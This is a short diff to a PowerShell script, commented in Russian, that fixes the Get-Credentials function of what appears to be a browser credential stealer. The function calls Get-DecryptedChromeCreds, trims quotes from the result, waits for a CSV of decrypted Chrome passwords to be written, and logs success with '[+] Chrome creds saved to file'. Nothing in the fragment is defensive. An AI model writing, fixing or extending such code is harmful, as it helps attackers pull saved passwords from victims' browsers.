@@ -515,9 +515,13 @@ function Get-DecryptedChromeCreds {
 function Get-Credentials {
     try {
         $chromeCreds = Get-DecryptedChromeCreds
-
         Output-Log "[DEBUG] chromeCreds raw: '$chromeCreds'"
-        Start-Sleep -Milliseconds 300  # дать время системе создать файл
+
+        # Удаляем лишние кавычки
+        $chromeCreds = $chromeCreds.Trim("'")
+
+        # Ждём появления файла
+        Start-Sleep -Milliseconds 300
 
         if ((Test-Path $chromeCreds) -and ($chromeCreds -like "*.csv")) {
             Output-Log "[+] Chrome creds saved to file: $chromeCreds"
@@ -535,6 +539,7 @@ function Get-Credentials {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
